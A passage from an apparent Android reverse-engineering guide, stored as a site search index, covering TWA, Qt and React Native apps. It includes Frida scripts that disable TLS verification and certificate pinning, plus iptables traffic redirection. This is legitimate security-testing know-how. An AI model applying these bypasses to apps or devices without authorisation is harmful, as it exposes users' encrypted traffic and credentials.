thousands.</p>"},{"location":"reversing/frameworks/pwa-twa/#bubblewrap-detection","title":"Bubblewrap Detection","text":"<p>Most TWAs are built using Bubblewrap, Google's CLI tool for generating TWA wrapper APKs. Bubblewrap-generated APKs have a predictable structure:</p> <pre><code>unzip -l target.apk | grep -E \"(LauncherActivity|DelegationService|chromium)\"\n</code></pre>"},{"location":"reversing/frameworks/pwa-twa/#code-location","title":"Code Location","text":""},{"location":"reversing/frameworks/pwa-twa/#what-is-in-the-apk","title":"What Is in the APK","text":"<p>The APK contains only:</p> <ul> <li><code>AndroidManifest.xml</code> -- activity declarations, Digital Asset Links references</li> <li>Thin Java/Kotlin launcher code (delegate to Chrome)</li> <li>App icons and splash screen resources</li> <li><code>res/values/strings.xml</code> -- may contain the target URL</li> <li>Digital Asset Links configuration</li> </ul>"},{"location":"reversing/frameworks/pwa-twa/#extracting-the-target-url","title":"Extracting the Target URL","text":"<p>All application logic (HTML, JavaScript, CSS, Service Workers) resides on the remote server. The only useful artifact in the APK is the target URL.</p> <p>The target web origin is the critical piece of information in the APK:</p> <pre><code>aapt dump resources target.apk | grep -A2 \"hostName\\|startUrl\\|origin\"\n</code></pre> <p>From decompiled Java (jadx):</p> <pre><code>jadx -d decompiled/ target.apk\ngrep -rn \"https://\" decompiled/ --include=\"*.java\"\n</code></pre> <p>The URL is typically stored in <code>res/values/strings.xml</code> or hardcoded in <code>LauncherActivity</code>.</p>"},{"location":"reversing/frameworks/pwa-twa/#digital-asset-links","title":"Digital Asset Links","text":"<p>The APK references a <code>/.well-known/assetlinks.json</code> file hosted on the target domain. This JSON file proves the domain owner authorized the APK:</p> <pre><code>curl -s https://target-domain.com/.well-known/assetlinks.json | python3 -m json.tool\n</code></pre> <p>The response contains the APK's package name and signing certificate fingerprint:</p> <pre><code>[{\n  \"relation\": [\"delegate_permission/common.handle_all_urls\"],\n  \"target\": {\n    \"namespace\": \"android_app\",\n    \"package_name\": \"com.example.twa\",\n    \"sha256_cert_fingerprints\": [\"AB:CD:EF:...\"]\n  }\n}]\n</code></pre>"},{"location":"reversing/frameworks/pwa-twa/#analysis-approach","title":"Analysis Approach","text":""},{"location":"reversing/frameworks/pwa-twa/#web-focused-analysis","title":"Web-Focused Analysis","text":"<p>Since the code lives on the server, standard web application analysis techniques apply:</p> Technique Tool Purpose Browser DevTools Chrome/Firefox Inspect DOM, network requests, service worker, local storage Proxy interception mitmproxy, Burp Suite Capture and modify HTTP/S traffic Service Worker analysis Chrome DevTools (Application tab) Examine caching strategy, push notification handlers JavaScript analysis Browser DevTools Sources Read, debug, and breakpoint application code API enumeration Burp Suite, Postman Map backend endpoints discovered through traffic analysis"},{"location":"reversing/frameworks/pwa-twa/#proxy-setup-for-twa","title":"Proxy Setup for TWA","text":"<p>Intercept TWA traffic by configuring a system-wide proxy on the Android device and installing the proxy CA certificate:</p> <pre><code>adb shell settings put global http_proxy 192.168.1.100:8080\nadb push burp-cert.pem /sdcard/\n</code></pre>"},{"location":"reversing/frameworks/pwa-twa/#service-worker-and-cache-extraction","title":"Service Worker and Cache Extraction","text":"<p>Service Workers are cached by Chrome on the device. Access them through Chrome DevTools remote debugging:</p> <pre><code>adb forward tcp:9222 localabstract:chrome_devtools_remote\n</code></pre> <p>Then navigate to <code>chrome://inspect</code> on the desktop browser. On a rooted device, Chrome's cache directories under <code>/data/data/com.android.chrome/app_chrome/Default/Service Worker/CacheStorage/</code> contain cached responses and service worker scripts.</p>"},{"location":"reversing/frameworks/pwa-twa/#security-implications","title":"Security Implications","text":""},{"location":"reversing/frameworks/pwa-twa/#origin-verification-bypass","title":"Origin Verification Bypass","text":"<p>The TWA trust model depends on Digital Asset Links verification. If an attacker can:</p> <ol> <li>Register a domain and host <code>assetlinks.json</code> pointing to their APK</li> <li>Build a TWA targeting that domain</li> <li>Later modify the web content to be malicious</li> </ol> <p>The APK signature verification only proves the APK publisher owns the domain -- it says nothing about the safety of the web content. The web application can change at any time without updating the APK.</p>"},{"location":"reversing/frameworks/pwa-twa/#no-native-bridge","title":"No Native Bridge","text":"<p>TWAs run inside Chrome's sandbox with no JavaScript bridge to native Android APIs. The PWA is limited to browser-granted capabilities: camera/microphone (via permissions prompt), GPS (Geolocation API), push notifications (Push API), local storage (IndexedDB), and same-origin network requests. No access to contacts, SMS, call logs, or file system beyond browser sandbox.</p>"},{"location":"reversing/frameworks/pwa-twa/#phishing-surface","title":"Phishing Surface","text":"<p>TWAs are effective phishing vectors because the thin APK passes static analysis (no malicious native code), web content can change after app store review, full-screen mode hides the URL bar making origin verification impossible for the user, and the app icon/splash screen mimic legitimate applications.</p>"},{"location":"reversing/frameworks/pwa-twa/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/pwa-twa/#limited-native-hooks","title":"Limited Native Hooks","text":"<p>The TWA APK contains minimal code, so Frida hook surface is small:</p> <pre><code>Java.perform(function() {\n    var Builder = Java.use(\"androidx.browser.customtabs.CustomTabsIntent$Builder\");\n    Builder.build.implementation = function() {\n        console.log(\"[TWA] CustomTabsIntent built\");\n        return this.build();\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/pwa-twa/#network-level-interception","title":"Network-Level Interception","text":"<p>Proxy-based interception is the most effective approach. Use mitmproxy or Burp Suite with iptables on a rooted device to force traffic through the proxy:</p> <pre><code>adb shell iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 192.168.1.100:8080\nadb shell iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 192.168.1.100:8080\n</code></pre>"},{"location":"reversing/frameworks/pwa-twa/#ssl-pinning","title":"SSL Pinning","text":"<p>TWAs inherit Chrome's certificate handling. Chrome does not support user-installed CA certificates for HTTPS interception by default on Android 7+. Options:</p> Method Requirement System CA installation Root access to place cert in <code>/system/etc/security/cacerts/</code> Magisk module MagiskTrustUserCerts moves user certs to system store Patched Chrome Use a Chromium build with certificate verification disabled Network Security Config Not applicable -- TWA uses Chrome, not a WebView you control"},{"location":"reversing/frameworks/pwa-twa/#malware-context","title":"Malware Context","text":"<p>TWAs are used in phishing and scam campaigns where the threat actor wants:</p> Use Case Details Phishing Full-screen app mimicking banking/payment sites, no visible URL bar to alert the user Scam storefronts Fake e-commerce sites wrapped as apps, content changes post-review Credential harvesting Login forms that POST to attacker-controlled servers Dynamic payload APK passes store review with benign content, switches to malicious web content later <p>The thin APK passes most static analysis tools because there is no malicious code in the package. All malicious behavior exists on the remote server and can be toggled at will.</p>"},{"location":"reversing/frameworks/pwa-twa/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Assessment APK analysis Trivial -- minimal code, extract target URL Web code access Depends on server -- visible via DevTools and proxy String extraction N/A -- no code in APK to extract strings from Dynamic analysis Standard web security testing Patching Not applicable -- code is server-side Overall difficulty Easy for APK, Variable for web application (rank 4/28) <p>The APK is trivial to analyze -- extract the target URL and shift to standard web application penetration testing (OWASP Testing Guide). The difficulty depends entirely on the server-side web application.</p>"},{"location":"reversing/frameworks/pwa-twa/#references","title":"References","text":"<ul> <li>Trusted Web Activities -- Google Developers</li> <li>Bubblewrap -- TWA Generator</li> <li>Digital Asset Links Documentation</li> <li>mitmproxy</li> <li>MagiskTrustUserCerts</li> <li>Frida</li> <li>jadx</li> </ul>"},{"location":"reversing/frameworks/qt/","title":"Qt for Android","text":"<p>Qt for Android apps are built in C++ (with optional QML for UI), compiled to native ARM shared libraries via Qt's toolchain. The Android wrapper is a thin Java shell that bootstraps the Qt runtime, loads native libraries, and delegates all rendering and logic to the C++ layer. Qt is maintained by The Qt Company and is used in both commercial and open-source applications, ranging from industrial control panels to media players ported from desktop.</p>"},{"location":"reversing/frameworks/qt/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/qt/#runtime-model","title":"Runtime Model","text":"<p>Qt apps on Android follow a host-guest pattern:</p> Layer Components Java shell <code>QtActivity</code> (extends <code>Activity</code>), <code>QtServiceDelegate</code>, loader classes in <code>org.qtproject.qt5.*</code> or <code>org.qtproject.qt.*</code> Qt runtime <code>libQt5Core.so</code> / <code>libQt6Core.so</code>, <code>libQt5Gui.so</code> / <code>libQt6Gui.so</code>, <code>libQt5Widgets.so</code> or <code>libQt5Quick.so</code> / <code>libQt6Quick.so</code> Application Developer's native <code>.so</code> (e.g., <code>libMyApp.so</code>) compiled from C++ sources QML engine <code>libQt5Qml.so</code> / <code>libQt6Qml.so</code> -- interprets <code>.qml</code> files for declarative UI <p>The Java shell performs minimal work: it initializes the Android <code>Activity</code>, sets up the <code>SurfaceView</code> for rendering, and calls <code>System.loadLibrary()</code> to load the Qt libraries. From that point, all logic runs in native code.</p>"},{"location":"reversing/frameworks/qt/#qt-widgets-vs-qml","title":"Qt Widgets vs QML","text":"<p>Qt apps use one of two UI paradigms:</p> Paradigm Description Qt Widgets Traditional C++ UI, fully compiled into the native <code>.so</code>, no extractable UI definitions QML / Qt Quick Declarative UI language (JavaScript-like syntax), stored as <code>.qml</code> files either embedded in Qt Resource files (<code>.rcc</code> / <code>.qrc</code>) or shipped as assets <p>QML apps are significantly easier to reverse because the UI logic is in readable text files rather than compiled C++.</p>"},{"location":"reversing/frameworks/qt/#rendering-pipeline","title":"Rendering Pipeline","text":"<p>Qt renders its own UI surface rather than using Android's native view system. It draws directly to a <code>SurfaceView</code> or <code>TextureView</code> via OpenGL ES or Vulkan. This means standard Android UI inspection tools (Layout Inspector, <code>uiautomator</code>) show a single opaque surface with no widget hierarchy.</p>"},{"location":"reversing/frameworks/qt/#identification","title":"Identification","text":"Indicator Location <code>libQt5Core.so</code> or <code>libQt6Core.so</code> <code>lib/&lt;arch&gt;/</code> in APK <code>libQt5Gui.so</code> or <code>libQt6Gui.so</code> <code>lib/&lt;arch&gt;/</code> <code>libQt5Quick.so</code> or <code>libQt6Quick.so</code> Present if app uses QML <code>libQt5Qml.so</code> or <code>libQt6Qml.so</code> QML engine library <code>org.qtproject.qt5.android.*</code> DEX classes (Qt5) <code>org.qtproject.qt.android.*</code> DEX classes (Qt6) <code>assets/--QtLoader--</code> Qt deployment metadata <code>assets/*.rcc</code> Compiled Qt Resource files <code>.qml</code> files in assets QML source files (if not packed into <code>.rcc</code>) <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -iE \"(libQt|\\.rcc|\\.qml|qtproject)\"\n</code></pre>"},{"location":"reversing/frameworks/qt/#code-location","title":"Code Location","text":""},{"location":"reversing/frameworks/qt/#native-libraries","title":"Native Libraries","text":"<p>All application logic resides in native <code>.so</code> files in <code>lib/&lt;arch&gt;/</code>:</p> <pre><code>unzip target.apk \"lib/arm64-v8a/*\" -d extracted/\nls extracted/lib/arm64-v8a/\n</code></pre> <p>The developer's code is typically in a single <code>.so</code> file (e.g., <code>libMyApp.so</code>), while Qt framework libraries are separate (<code>libQt5Core.so</code>, <code>libQt5Network.so</code>, etc.). The app <code>.so</code> links against the Qt libraries.</p>"},{"location":"reversing/frameworks/qt/#qml-resources","title":"QML Resources","text":"<p>QML files may be:</p> <ol> <li>Loose in assets -- directly readable after APK extraction</li> <li>Packed in <code>.rcc</code> files -- compiled Qt Resource Container format</li> <li>Compiled into the binary -- embedded via Qt's resource system at build time</li> </ol>"},{"location":"reversing/frameworks/qt/#extracting-qml-from-rcc-files","title":"Extracting QML from .rcc Files","text":"<p>Qt Resource files (<code>.rcc</code>) use a documented binary format. The <code>rcc</code> tool from a Qt SDK installation can list and extract contents:</p> <pre><code>rcc --list assets/qml_resources.rcc\nrcc --output extracted_resources/ assets/qml_resources.rcc\n</code></pre> <p>Alternatively, use qrc_extractor or parse the format manually. The <code>.rcc</code> header starts with <code>qres</code> (magic bytes <code>0x71 0x72 0x65 0x73</code>).</p> <p>For resources compiled into the binary, search for the <code>qInitResources</code> function in the native <code>.so</code> -- the resource data is embedded as a byte array and registered at startup:</p> <pre><code>strings libMyApp.so | grep -E \"(\\.qml|\\.js|qrc:/)\"\n</code></pre>"},{"location":"reversing/frameworks/qt/#analysis-tools-workflow","title":"Analysis Tools &amp; Workflow","text":"Tool Purpose Ghidra Primary disassembler for native ARM analysis of application <code>.so</code> IDA Pro Commercial disassembler with superior ARM decompilation rizin/Cutter Open-source alternative for native binary analysis jadx Decompile the Java shell (minimal logic but reveals library loading order) rcc Qt Resource Compiler -- extract <code>.rcc</code> file contents Frida Runtime hooking of native functions GammaRay Qt introspection tool (requires debug build or injection)"},{"location":"reversing/frameworks/qt/#recommended-workflow","title":"Recommended Workflow","text":"<ol> <li>Unzip APK and confirm Qt presence via <code>libQt5Core.so</code> / <code>libQt6Core.so</code></li> <li>Identify UI paradigm -- presence of <code>libQt5Quick.so</code> or <code>.qml</code> files indicates QML</li> <li>Extract QML from assets or <code>.rcc</code> files -- this is the easiest win for understanding UI logic and data flow</li> <li>Load application <code>.so</code> into Ghidra or IDA for native analysis</li> <li>Recover Qt metadata -- Qt's meta-object system (MOC) embeds signal/slot names, property definitions, and class hierarchies as structured data in the binary</li> <li>Search for string literals in the native binary for API endpoints, encryption keys, protocol details</li> <li>Hook at runtime with Frida to intercept network calls, crypto operations, and business logic</li> </ol>"},{"location":"reversing/frameworks/qt/#qt-meta-object-recovery","title":"Qt Meta-Object Recovery","text":"<p>Qt's Meta-Object Compiler (MOC) generates metadata structures for every <code>QObject</code> subclass. These structures survive compilation and contain:</p> <ul> <li>Class names as plaintext strings</li> <li>Signal and slot method names</li> <li>Property names and types</li> <li>Enumeration values</li> </ul> <p>In Ghidra, search for cross-references to <code>QMetaObject::staticMetaObject</code> or look for the <code>qt_meta_data_</code> and <code>qt_meta_stringdata_</code> symbols. These provide a roadmap of the application's class hierarchy, method names, and inter-object communication patterns.</p> <pre><code>strings libMyApp.so | grep -E \"^(qt_meta_|staticMetaObject)\"\n</code></pre>"},{"location":"reversing/frameworks/qt/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/qt/#network-interception","title":"Network Interception","text":"<p>Qt apps use <code>QNetworkAccessManager</code> for HTTP/HTTPS requests. Hook the native implementation to intercept all network traffic:</p> <pre><code>var libNetwork = Process.findModuleByName(\"libQt5Network.so\") || Process.findModuleByName(\"libQt6Network.so\");\nif (libNetwork) {\n    libNetwork.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"QNetworkAccessManager\") !== -1 &amp;&amp; exp.name.indexOf(\"createRequest\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log(\"[Qt Network] createRequest called\");\n                },\n                onLeave: function(retval) {}\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/qt/#signalslot-interception","title":"Signal/Slot Interception","text":"<p>Qt's signal/slot mechanism routes through <code>QMetaObject::activate</code>. Hooking this function intercepts all inter-object communication:</p> <pre><code>var libCore = Process.findModuleByName(\"libQt5Core.so\") || Process.findModuleByName(\"libQt6Core.so\");\nif (libCore) {\n    libCore.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"QMetaObject\") !== -1 &amp;&amp; exp.name.indexOf(\"activate\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log(\"[Qt Signal] activate called from: \" + Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(\"\\n\"));\n                },\n                onLeave: function(retval) {}\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/qt/#crypto-and-data-hooks","title":"Crypto and Data Hooks","text":"<p>For intercepting cryptographic operations, target <code>QCryptographicHash</code>, <code>QSslSocket</code>, and any custom crypto wrappers:</p> <pre><code>var libCore = Process.findModuleByName(\"libQt5Core.so\") || Process.findModuleByName(\"libQt6Core.so\");\nif (libCore) {\n    libCore.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"QCryptographicHash\") !== -1 &amp;&amp; exp.name.indexOf(\"addData\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    var data = args[1];\n                    var len = args[2].toInt32();\n                    console.log(\"[Qt Crypto] addData len=\" + len + \" data=\" + hexdump(data, {length: Math.min(len, 64)}));\n                },\n                onLeave: function(retval) {}\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/qt/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Qt implements SSL/TLS through <code>QSslSocket</code>, which wraps OpenSSL (bundled with Qt for Android). SSL pinning is enforced via <code>QSslSocket::setPeerVerifyMode()</code> and custom <code>QSslError</code> handling in the <code>sslErrors</code> signal.</p>"},{"location":"reversing/frameworks/qt/#qsslsocket-verification-hook","title":"QSslSocket Verification Hook","text":"<pre><code>var libNetwork = Process.findModuleByName(\"libQt5Network.so\") || Process.findModuleByName(\"libQt6Network.so\");\nif (libNetwork) {\n    libNetwork.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"QSslSocket\") !== -1 &amp;&amp; exp.name.indexOf(\"setPeerVerifyMode\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    args[1] = ptr(0);\n                    console.log(\"[SSL] setPeerVerifyMode forced to VerifyNone\");\n                }\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/qt/#ignoring-ssl-errors","title":"Ignoring SSL Errors","text":"<p>Qt apps that pin certificates typically connect the <code>sslErrors</code> signal to a slot that calls <code>QSslSocket::ignoreSslErrors()</code>. To force bypass, hook <code>ignoreSslErrors</code> to always execute, or hook the error handler to suppress certificate validation failures:</p> <pre><code>var libNetwork = Process.findModuleByName(\"libQt5Network.so\") || Process.findModuleByName(\"libQt6Network.so\");\nif (libNetwork) {\n    libNetwork.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"QNetworkReply\") !== -1 &amp;&amp; exp.name.indexOf(\"sslErrors\") !== -1 &amp;&amp; exp.type === \"function\") {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log(\"[SSL] sslErrors signal intercepted -- suppressing\");\n                },\n                onLeave: function(retval) {}\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/qt/#openssl-direct-bypass","title":"OpenSSL Direct Bypass","text":"<p>Since Qt bundles its own OpenSSL, the standard <code>SSL_CTX_set_verify</code> bypass also works:</p> <pre><code>var libssl = Process.findModuleByName(\"libssl.so\");\nif (libssl) {\n    var sslVerify = libssl.findExportByName(\"SSL_CTX_set_verify\");\n    if (sslVerify) {\n        Interceptor.attach(sslVerify, {\n            onEnter: function(args) {\n                args[1] = ptr(0);\n                args[2] = ptr(0);\n                console.log(\"[SSL] SSL_CTX_set_verify forced to SSL_VERIFY_NONE\");\n            }\n        });\n    }\n}\n</code></pre>"},{"location":"reversing/frameworks/qt/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Qt Widgets QML / Qt Quick Code format Compiled C++ (native ARM) C++ logic compiled + QML text files for UI Readability Low -- requires native disassembly Moderate -- QML files are readable, C++ still requires disassembly String extraction Good -- Qt MOC metadata preserves class/method names Good -- QML files contain property names, signal connections Control flow recovery Standard native RE techniques UI flow visible in QML, business logic requires native RE Patching Binary patching of <code>.so</code> Edit QML files directly for UI changes, binary patch for logic Overall difficulty Hard (rank 8/28) Moderate-Hard (rank 11/28) <p>The Qt meta-object system is a significant advantage for reverse engineers -- it preserves class names, method signatures, and signal/slot connections that would be stripped in a typical native binary. QML apps provide even more surface area because the UI layer is declarative text. The primary challenge is the compiled C++ business logic, which requires standard native ARM reverse engineering skills.</p>"},{"location":"reversing/frameworks/qt/#references","title":"References","text":"<ul> <li>Qt for Android Documentation</li> <li>Qt Resource System</li> <li>Qt Meta-Object System</li> <li>GammaRay -- KDAB Qt Introspection</li> <li>qrc-extractor</li> <li>Frida -- Dynamic Instrumentation</li> <li>Ghidra</li> <li>rizin/Cutter</li> </ul>"},{"location":"reversing/frameworks/react-native/","title":"React Native","text":"<p>React Native apps run JavaScript (or Hermes bytecode) on an embedded engine, with a thin Java/Kotlin shell handling Android lifecycle events and a bridge (or JSI layer) connecting JS to native platform APIs. All business logic typically resides in a single bundled file -- <code>assets/index.android.bundle</code> -- making it the primary reverse engineering target. The framework is Meta's open-source mobile SDK and powers a significant share of cross-platform Android applications.</p>"},{"location":"reversing/frameworks/react-native/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/react-native/#old-architecture-bridge","title":"Old Architecture (Bridge)","text":"<p>React Native's original design uses three threads connected by an asynchronous JSON bridge:</p> Thread Role Main (UI) Android native UI rendering, touch events JS Runs the JavaScript engine (JSC or Hermes), executes app logic Shadow Yoga layout engine, computes UI tree diffs <p>JavaScript calls native modules by serializing messages as JSON over the bridge. Native modules respond the same way. Every cross-boundary call passes through <code>com.facebook.react.bridge.CatalystInstanceImpl</code>, which is the central dispatch point for bridge messages.</p>"},{"location":"reversing/frameworks/react-native/#new-architecture-jsi-bridgeless","title":"New Architecture (JSI / Bridgeless)","text":"<p>Since React Native 0.76 (October 2024), the New Architecture is enabled by default. It replaces the asynchronous JSON bridge with the JavaScript Interface (JSI), a C++ layer allowing synchronous, direct calls between JavaScript and native code.</p> Component Purpose JSI C++ interface enabling JS to hold direct references to native objects -- no serialization overhead TurboModules Lazy-loaded native modules accessed via JSI instead of the bridge registry Fabric New rendering system using a C++ shadow tree, supports concurrent rendering Codegen Generates type-safe C++ bindings from JS specs at build time <p>For reverse engineering, the New Architecture means fewer JSON-serialized messages to intercept on the bridge and more direct C++ calls. Hooking strategy shifts from Java bridge interception toward native-level instrumentation of <code>libjsi.so</code> and TurboModule entry points.</p>"},{"location":"reversing/frameworks/react-native/#identification","title":"Identification","text":"Indicator Location <code>assets/index.android.bundle</code> JS bundle (plaintext or Hermes bytecode) <code>libjsc.so</code> JavaScriptCore engine (older apps) <code>libhermes.so</code> Hermes engine (default since RN 0.70) <code>libhermes_executor.so</code> Hermes execution bridge <code>libjsi.so</code> JSI runtime (New Architecture) <code>com.facebook.react.*</code> Package prefix in DEX classes <code>com.facebook.react.ReactActivity</code> Main activity superclass <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -E \"(index\\.android\\.bundle|libhermes|libjsc|libjsi)\"\n</code></pre>"},{"location":"reversing/frameworks/react-native/#javascript-engines","title":"JavaScript Engines","text":""},{"location":"reversing/frameworks/react-native/#javascriptcore-jsc","title":"JavaScriptCore (JSC)","text":"<p>Older React Native apps (pre-0.70 default, still optional) use Apple's JavaScriptCore engine compiled for Android. The bundle at <code>assets/index.android.bundle</code> is a plaintext JavaScript file -- minified, but fully readable.</p> <p>Extraction is trivial:</p> <pre><code>unzip target.apk assets/index.android.bundle -d extracted/\n</code></pre> <p>The extracted file is standard JavaScript. Run it through a beautifier (<code>js-beautify</code>, Prettier) and search for string literals, API endpoints, hardcoded secrets, and authentication logic directly.</p>"},{"location":"reversing/frameworks/react-native/#hermes","title":"Hermes","text":"<p>Hermes is Meta's custom JS engine, purpose-built for React Native. It compiles JavaScript to Hermes Bytecode (HBC) at build time, producing a binary blob rather than plaintext JS. Hermes has been the default engine since React Native 0.70.</p>"},{"location":"reversing/frameworks/react-native/#hbc-file-format","title":"HBC File Format","text":"<p>The Hermes bytecode format starts with a distinctive header:</p> Offset Size Field Value 0x00 8 bytes Magic <code>c6 1f bc 03 c1 03 19 1f</code> (little-endian: <code>0x1F1903C103BC1FC6</code>) 0x08 4 bytes Bytecode version Version number (e.g., 84, 89, 90, 93, 94, 95, 96) 0x0C 20 bytes SHA1 hash Source hash for integrity 0x20 4 bytes File length Total bytecode file size 0x24 4 bytes Global code index Entry point function ID <p>Identification with <code>file</code> or <code>xxd</code>:</p> <pre><code>file assets/index.android.bundle\nxxd -l 32 assets/index.android.bundle\n</code></pre> <p>If the first bytes match the magic above, the bundle is Hermes bytecode. The <code>file</code> utility on Linux recognizes it and reports the Hermes version (e.g., \"Hermes JavaScript bytecode, version 94\").</p> <p>Version Fragmentation</p> <p>The HBC format version changes across Hermes releases. Tools must support the specific version in the target APK. A tool built for HBC v84 will not parse v96 bundles. Always check the version field before choosing a decompiler.</p>"},{"location":"reversing/frameworks/react-native/#hbc-internal-structure","title":"HBC Internal Structure","text":"<p>After the header, the file contains:</p> <ul> <li>Function header table -- metadata for each function (parameter count, register count, bytecode offset)</li> <li>String table -- all string literals indexed by ID</li> <li>String storage -- raw bytes for the string table entries</li> <li>Bytecode segments -- per-function instruction sequences</li> <li>Regular expression table -- compiled regex patterns</li> <li>CommonJS module table -- module resolution metadata</li> </ul> <p>The bytecode uses a register-based VM with typed instructions. Each function operates on its own register frame.</p>"},{"location":"reversing/frameworks/react-native/#code-location-extraction","title":"Code Location &amp; Extraction","text":""},{"location":"reversing/frameworks/react-native/#jsc-bundle","title":"JSC Bundle","text":"<pre><code>unzip target.apk assets/index.android.bundle -d out/\nnpx prettier --write out/assets/index.android.bundle\n</code></pre> <p>The output is human-readable JavaScript. Search for API endpoints, credentials, cryptographic keys, and business logic directly.</p>"},{"location":"reversing/frameworks/react-native/#hermes-bundle","title":"Hermes Bundle","text":"<p>Extract the HBC file the same way, then use specialized tooling to decompile:</p> hermes-dechbctoolhermes_rs <pre><code>pip install hermes-dec\nhermes-dec --hasm assets/index.android.bundle -o disassembly/\nhermes-dec --decompile assets/index.android.bundle -o decompiled.js\n</code></pre> <p>hermes-dec (P1 Security) produces both disassembly and a pseudo-JavaScript decompilation. The decompiler output uses registers (<code>r0</code>, <code>r1</code>) and label-based jumps rather than structured control flow, but string references and function calls are resolved.</p> <pre><code>pip install hbctool\nhbctool disasm assets/index.android.bundle output_dir/\n</code></pre> <p>hbctool disassembles to a textual Hermes assembly format and supports reassembly -- enabling binary patching of the bytecode. Modify the disassembly, reassemble with <code>hbctool asm</code>, and repackage the APK.</p> <p>hermes_rs is a Rust-based disassembler and assembler supporting HBC versions 89, 90, 93, 94, 95, and 96. Useful when <code>hermes-dec</code> or <code>hbctool</code> lag behind the latest Hermes version.</p>"},{"location":"reversing/frameworks/react-native/#string-extraction-shortcut","title":"String Extraction Shortcut","text":"<p>Even without full decompilation, dumping strings from an HBC file reveals API endpoints, error messages, and logic hints:</p> <pre><code>strings assets/index.android.bundle | grep -iE \"(api|http|token|key|secret|password|login)\"\n</code></pre>"},{"location":"reversing/frameworks/react-native/#analysis-tools-workflow","title":"Analysis Tools &amp; Workflow","text":"Tool Purpose Hermes Support hermes-dec Disassembly + decompilation of HBC Multi-version hbctool Disassembly, patching, reassembly Up to v90 (forks for v96) hermes_rs Rust disassembler/assembler v89-96 jadx DEX decompilation (Java shell only) N/A Frida Runtime hooking All versions Ghidra Native analysis of <code>libhermes.so</code> N/A"},{"location":"reversing/frameworks/react-native/#recommended-workflow","title":"Recommended Workflow","text":"<ol> <li>Unzip APK and identify engine (<code>libhermes.so</code> vs <code>libjsc.so</code>)</li> <li>Extract bundle from <code>assets/index.android.bundle</code></li> <li>Check HBC version (<code>xxd -l 12</code> or <code>file</code>)</li> <li>Decompile with hermes-dec or format/beautify if JSC plaintext</li> <li>Search decompiled output for API endpoints, auth logic, hardcoded keys</li> <li>Hook at runtime with Frida for dynamic values (tokens, decrypted data)</li> <li>Patch bundle with hbctool if behavior modification is needed</li> </ol>"},{"location":"reversing/frameworks/react-native/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>React Native SSL pinning typically operates at the Java layer, using OkHttp's <code>CertificatePinner</code> or a custom <code>TrustManager</code>. Standard Android SSL bypass scripts work because the pinning lives in the Java HTTP client, not in the JS engine.</p> <pre><code>Java.perform(function() {\n    var CertPinner = Java.use(\"okhttp3.CertificatePinner\");\n    CertPinner.check.overload(\"java.lang.String\", \"java.util.List\").implementation = function(host, certs) {\n        console.log(\"[SSL] Bypassed pin for: \" + host);\n    };\n\n    var TrustManagerImpl = Java.use(\"com.android.org.conscrypt.TrustManagerImpl\");\n    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {\n        console.log(\"[SSL] Bypassed TrustManager for: \" + host);\n        return untrustedChain;\n    };\n});\n</code></pre> <p>Some apps implement pinning in JS using libraries like <code>react-native-ssl-pinning</code> or <code>rn-fetch-blob</code> with cert checks. For these, patch the JS bundle directly:</p> <ol> <li>Decompile with hbctool</li> <li>Locate the pinning check function</li> <li>Patch the comparison to always pass</li> <li>Reassemble and repackage</li> </ol>"},{"location":"reversing/frameworks/react-native/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/react-native/#bridge-interception-old-architecture","title":"Bridge Interception (Old Architecture)","text":"<p>The central hook target for bridge-based apps is <code>CatalystInstanceImpl</code>, which routes all JS-to-native calls:</p> <pre><code>Java.perform(function() {\n    var CatalystInstance = Java.use(\"com.facebook.react.bridge.CatalystInstanceImpl\");\n\n    CatalystInstance.jniCallJSFunction.implementation = function(module, method, args) {\n        console.log(\"[Bridge] \" + module + \".\" + method + \" args=\" + args);\n        this.jniCallJSFunction(module, method, args);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/react-native/#native-module-interception","title":"Native Module Interception","text":"<p>React Native native modules register as Java classes inheriting <code>ReactContextBaseJavaModule</code>. Hook specific modules to intercept their functionality:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            if (className.indexOf(\"com.facebook.react\") !== -1 &amp;&amp; className.indexOf(\"Module\") !== -1) {\n                console.log(\"[RN Module] \" + className);\n            }\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/frameworks/react-native/#js-context-injection","title":"JS Context Injection","text":"<p>Inject arbitrary JavaScript into the React Native runtime by hooking the bundle loader:</p> <pre><code>Java.perform(function() {\n    var CatalystInstance = Java.use(\"com.facebook.react.bridge.CatalystInstanceImpl\");\n\n   